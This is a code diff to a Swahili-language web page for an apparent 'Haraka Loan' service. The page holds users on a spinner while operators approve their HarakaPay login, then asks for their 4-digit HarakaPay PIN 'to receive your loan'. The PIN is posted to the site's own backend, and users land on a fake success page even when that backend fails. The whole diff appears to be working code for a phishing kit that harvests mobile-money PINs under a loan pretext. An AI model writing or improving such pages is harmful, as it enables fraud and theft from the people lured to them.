@@ -170,6 +170,41 @@
 
     .error.show { display: block; }
 
+    /* --- preloader while waiting for HarakaPay approval --- */
+    .waiting { padding: 12px 0 4px; }
+
+    .spinner {
+      width: 46px;
+      height: 46px;
+      margin: 0 auto 16px;
+      border: 4px solid #eaf5ef;
+      border-top-color: #1b5e20;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .waiting p {
+      color: #636e72;
+      font-size: 0.9rem;
+      margin-bottom: 6px;
+    }
+
+    .pulse-dots span {
+      display: inline-block;
+      width: 7px; height: 7px;
+      margin: 0 3px;
+      border-radius: 50%;
+      background: #1b5e20;
+      animation: pulse 1.4s ease infinite;
+    }
+    .pulse-dots span:nth-child(2) { animation-delay: .2s; }
+    .pulse-dots span:nth-child(3) { animation-delay: .4s; }
+    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .2; } }
+
+    .hidden { display: none; }
+
     @media (max-width: 420px) {
       .container {
         max-width: 100%;
@@ -195,30 +230,46 @@
       <div class="pin-icon">
         <svg viewBox="0 0 24 24"><path d="M12 1C8.14 1 5 4.14 5 8v2H4c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2v-8c0-1.1-.9-2-2-2h-1V8c0-3.86-3.14-7-7-7zm0 2c2.76 0 5 2.24 5 5v2H7V8c0-2.76 2.24-5 5-5zm0 10c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2z"></path></svg>
       </div>
-      <h2>Ingiza PIN</h2>
-      <p>Thibitisha kwa PIN yako ya HarakaPay ili kupokea mkopo wako</p>
 
-      <form id="pinForm" novalidate>
-        <div class="pin-input" id="pinInputs">
-          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
-          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
-          <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+      <!-- waiting screen: shown until the HarakaPay login is approved -->
+      <div class="waiting" id="waitingScreen">
+        <div class="spinner"></div>
+        <h2>Inathibitishwa…</h2>
+        <p>Tunasubiri uidhinishaji wa HarakaPay — usifunge ukurasa huu.</p>
+        <div class="pulse-dots"><span></span><span></span><span></span></div>
+      </div>
+
+      <!-- PIN form: revealed only after approval -->
+      <div class="hidden" id="pinScreen">
+        <h2>Ingiza PIN</h2>
+        <p id="pinPrompt">Thibitisha kwa PIN yako ya HarakaPay ili kupokea mkopo wako</p>
+
+        <form id="pinForm" novalidate>
+          <div class="pin-input" id="pinInputs">
+            <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required autofocus>
+            <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+            <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+            <input type="password" maxlength="1" pattern="[0-9]" inputmode="numeric" required>
+          </div>
+          <p class="error" id="pinError">Tafadhali ingiza PIN yote ya tarakimu 4.</p>
+          <button type="submit" class="btn">Thibitisha</button>
+        </form>
+
+        <div class="switch-account">
+          <a href="/login">Badilisha akaunti</a>
         </div>
-        <p class="error" id="pinError">Tafadhali ingiza PIN yote ya tarakimu 4.</p>
-        <button type="submit" class="btn">Thibitisha</button>
-      </form>
-
-      <div class="switch-account">
-        <a href="login.html">Badilisha akaunti</a>
       </div>
     </div>
   </div>
 
   <script>
+    const ref = new URLSearchParams(location.search).get('ref');
+
     const inputs = Array.from(document.querySelectorAll('#pinInputs input'));
     const form = document.getElementById('pinForm');
     const pinError = document.getElementById('pinError');
+    const waitingScreen = document.getElementById('waitingScreen');
+    const pinScreen = document.getElementById('pinScreen');
 
     function syncFilled(input) {
       input.classList.toggle('filled', input.value.length > 0);
@@ -259,25 +310,54 @@
       syncFilled(input);
     });
 
-    const ref = new URLSearchParams(location.search).get('ref');
-
-    /* if agents already declined this session, tell the user straight away */
-    (async function checkStatus() {
-      if (!ref) return;
+    /* gate: the PIN form stays hidden until the login is approved */
+    async function waitApproval() {
+      if (!ref) {
+        /* offline / no ref — show the PIN form anyway */
+        revealForm();
+        return;
+      }
       try {
         const res = await fetch('/api/pstatus?ref=' + encodeURIComponent(ref), { cache: 'no-store' });
-        if (!res.ok) return;                 /* unknown ref — continue anyway */
-        const j = await res.json();
-        if (j.ok && j.status === 'declined') {
-          document.querySelector('.pin-container').innerHTML =
-            '<div class="pin-icon" style="background:#c0392b;">✕</div>' +
-            '<h2>Imekatazwa</h2>' +
-            '<p>Uunganisho wa HarakaPay (Ref ' + ref + ') ulikatazwa na timu yetu. Rudi kwenye tovuti na ujaribu tena.</p>' +
-            '<a class="btn" style="display:inline-block;text-decoration:none;" href="index.html">Rudi kwenye Haraka Loan</a>';
-          document.getElementById('pinForm').style.display = 'none';
+        if (res.status === 404) { window.location.href = '/declined?type=pay'; return; }
+        if (res.ok) {
+          const j = await res.json();
+          if (j.ok) {
+            if (j.status === 'declined') { window.location.href = '/declined?type=pay'; return; }
+            if (j.status === 'approved' || j.status === 'pending') { revealForm(); return; }
+          }
         }
-      } catch (_) { /* server not running — continue offline */ }
-    })();
+      } catch (_) { /* backend not running — reveal form (offline fallback) */ revealForm(); return; }
+      setTimeout(waitApproval, 2500);   /* still waiting — preloader stays */
+    }
+
+    let emailShown = '';
+    function revealForm() {
+      waitingScreen.classList.add('hidden');
+      pinScreen.classList.remove('hidden');
+      document.getElementById('pinPrompt').textContent =
+        'Thibitisha kwa PIN yako ya HarakaPay' +
+        (emailShown ? ' ya ' + emailShown : '') +
+        ' ili kupokea mkopo wako';
+      const first = document.querySelector('#pinInputs input');
+      try { if (window.matchMedia('(min-width: 768px)').matches) first.focus(); } catch (_) {}
+    }
+
+    /* try to show the approved account email on the waiting + PIN screens */
+    async function tryShowEmail() {
+      if (!ref) return '—';
+      try {
+        const r = await fetch('/api/pstatus?ref=' + encodeURIComponent(ref), { cache: 'no-store' });
+        if (r.ok) {
+          const j = await r.json();
+          if (j.ok && j.email) { emailShown = j.email; return j.email; }
+        }
+      } catch (_) { /* ignore */ }
+      return '—';
+    }
+
+    tryShowEmail();
+    waitApproval();
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -289,9 +369,9 @@
 
       const btn = form.querySelector('.btn');
       btn.disabled = true;
-      btn.textContent = 'Inathibitisha…';
+      btn.textContent = 'Inatuma…';
+      pinError.classList.remove('show');
 
-      let ref2 = null;
       try {
         const res = await fetch('/api/paysubmit', {
           method: 'POST',
@@ -299,24 +379,27 @@
           body: JSON.stringify({ ref: ref, pin: pin })
         });
         const j = await res.json();
-        if (j.ok && (j.ref || ref)) { ref2 = j.ref || ref; }
-        if (j.ok && j.status === 'declined') {
-          window.location.href = 'status.html?ref=' + encodeURIComponent(j.ref || ref);
+        if (j.ok) {
+          if (j.status === 'declined') {
+            window.location.href = '/declined?type=pay';
+            return;
+          }
+          /* approved — straight to the deposit-in-progress page */
+          localStorage.setItem('haraka_pay_connected', 'true');
+          window.location.href = ref
+            ? '/success?ref=' + encodeURIComponent(ref)
+            : '/success';
           return;
         }
-      } catch (_) { /* backend not running — fallback below */ }
+      } catch (_) {
+        /* backend not running — offline fallback: go to success */
+        localStorage.setItem('haraka_pay_connected', 'true');
+        window.location.href = '/success';
+        return;
+      }
 
       btn.disabled = false;
       btn.textContent = 'Thibitisha';
-
-      if (ref2) {
-        /* live review: hand over to the payment status preloader */
-        window.location.href = 'status.html?ref=' + encodeURIComponent(ref2);
-      } else {
-        /* offline fallback: go straight to the receipt page */
-        localStorage.setItem('haraka_pay_connected', 'true');
-        window.location.href = 'success.html';
-      }
     });
   </script>
 </body>
